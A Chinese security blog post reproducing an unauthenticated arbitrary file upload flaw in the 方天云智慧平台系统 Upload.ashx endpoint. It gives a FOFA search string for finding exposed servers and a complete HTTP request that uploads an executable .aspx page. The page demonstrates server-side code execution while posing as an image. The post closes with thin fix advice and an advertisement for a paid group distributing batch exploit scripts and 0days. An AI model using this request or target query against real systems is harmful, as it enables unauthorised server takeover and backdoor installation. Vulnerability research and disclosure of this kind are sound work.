#  「漏洞复现」方天云智慧平台系统 Upload.ashx 任意文件上传漏洞   
冷漠安全  冷漠安全   2024-08-05 10:33  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/rPMtsalfZ0pFeDPJNnYaE7pYibBLQrUbLZwqelcotCqhYf0seBKfHroSUm8XuHyka5I3SmicWcJYUpZbFmxJCZ1Q/640?wx_fmt=gif&from=appmsg "")  
  
**0x01 免责声明**  
  
**免责声明**  
  
请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任。工具来自网络，安全性自测，如有侵权请联系删除。本次测试仅供学习使用，如若非法他用，与平台和本文作者无关，需自行负责！！！  
  
0x02  
  
**产品介绍**  
  
方天云智慧平台系统，作为方天科技公司的重要产品，是一款面向企业全流程的业务管理功能平台，集成了ERP（企业资源规划）、MES（车间执行系统）、APS（先进规划与排程）、PLM（产品生命周期）、CRM（客户关系管理）等多种功能模块，旨在通过云端服务为企业提供数字化、智能化的管理解决方案。  
  
0x03  
  
**漏洞威胁**  
  
方天云智慧平台系统 Upload.ashx 接口处存在任意文件上传漏洞，未经身份验证的攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个 web 服务器。  
  
0x04  
  
**漏洞环境**  
  
FOFA:  
```
body="AjaxMethods.asmx/GetCompanyItem"
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0qLXIh65ibQACdGqdODNDC7OYOlG6YWnYKowdScKEoFmdHx3uyZiatWNpxpHcj7T9R2SHmQWGkYA2fw/640?wx_fmt=png&from=appmsg "")  
  
0x05  
  
**漏洞复现**  
  
PoC  
```
POST /Upload.ashx HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarySl8siBbmVicABvTX
Connection: close


------WebKitFormBoundarySl8siBbmVicABvTX
Content-Disposition: form-data; name="file"; filename="qwe.aspx"
Content-Type: image/jpeg
<%@Page Language="C#"%><%Response.Write("hello");System.IO.File.Delete(Request.PhysicalPath);%>
------WebKitFormBoundarySl8siBbmVicABvTX--
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0qLXIh65ibQACdGqdODNDC7Oib3GEkTho76RkN9LV0YHoss8iaDMNbnghTQyyVaqhibeWZJzRcAH8EV4w/640?wx_fmt=png&from=appmsg "")  
  
验证  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0qLXIh65ibQACdGqdODNDC7OC5F293RWSEk8PhqCOMiaRsslGonicNJ1uLMwUKu6HNxRMxnJAzJicOBrQ/640?wx_fmt=png&from=appmsg "")  
  
  
0x06  
  
**批量脚本验证**  
  
Nuclei验证脚本已发布  
知识星球：冷漠安全  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0qLXIh65ibQACdGqdODNDC7OF3bribviaMiamPnD9OyF2ribYvXGa1Js9kKPdAaE32ibzvSs4X2iaTbvnO0A/640?wx_fmt=png&from=appmsg "")  
  
  
0x07  
  
**修复建议**  
  
关闭互联网暴露面或接口设置访问权限  
  
升级至安全版本  
  
0x08  
  
**加入我们**  
  
漏洞详情及批量检测POC工具请前往知识星球获取  
  
知识星球：冷漠安全交个朋友，限时优惠券：加入立减25星球福利：每天更新最新漏洞POC、资料文献、内部工具等  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0qLXIh65ibQACdGqdODNDC7O38j35XyCyCx7wHDyTUcriaIa6LeZKz77iaBicSIQxXTPdMvZhiabnMhIQQ/640?wx_fmt=png&from=appmsg "")  
  
  
「星球介绍」：  
  
本星球不割韭菜，不发烂大街东西。欢迎进来白嫖，不满意三天退款。  
  
本星球坚持每天分享一些攻防知识，包括攻防技术、网络安全漏洞预警脚本、网络安全渗透测试工具、解决方案、安全运营、安全体系、安全培训和安全标准等文库。  
  
本星主已加入几十余个付费星球，定期汇聚高质量资料及工具进行星球分享。  
  
  
「星球服务」：  
  
  
加入星球，你会获得：  
  
  
♦ 批量验证漏洞POC脚本  
  
  
♦ 0day、1day分享  
  
  
♦ 汇集其它付费星球资源分享  
  
  
♦ 大量的红蓝对抗实战资源  
  
  
♦ 优秀的内部红蓝工具及插件  
  
  
♦ 综合类别优秀Wiki文库及漏洞库  
  
  
♦ 提问及技术交流  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/rPMtsalfZ0qLXIh65ibQACdGqdODNDC7O6CetsQwpDocTvAuGe6PFlqH3KqLHhFGL9pYFHMfRiccA4wFiaUTuoAdg/640?wx_fmt=gif&from=appmsg "")  
  
  
  
